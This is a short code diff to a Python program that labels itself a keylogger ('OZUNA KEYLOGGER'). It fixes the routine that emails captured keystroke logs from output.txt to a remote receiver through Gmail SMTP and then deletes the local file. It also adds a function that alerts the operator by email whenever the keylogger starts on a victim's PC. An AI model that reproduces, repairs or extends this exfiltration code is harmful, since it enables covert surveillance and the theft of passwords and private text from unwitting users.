@@ -21,8 +21,22 @@ def send_log():
         \n\n
         {1}
         """.format(subject, contents)
-        s.sendmail(gmail_password, receiver, message)
+        message = message.encode("ascii", errors="ignore")
+        s.sendmail(gmail_user, receiver, message)
         print('EMAIL SENT TO ' + receiver)
         if os.path.exists('output.txt'):
             os.remove('output.txt')
         print(contents)
+
+
+def send_application_start_message():
+    startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(gmail_user, gmail_password)
+    message = """Subject: OZUNA KEYLOGGER STARTED
+    \n\n
+    The purpose of this email is to indicate the the service started in a client PC
+    Date of the act: {0}
+    """.format(startingDate)
+    s.sendmail(gmail_user, receiver, message)
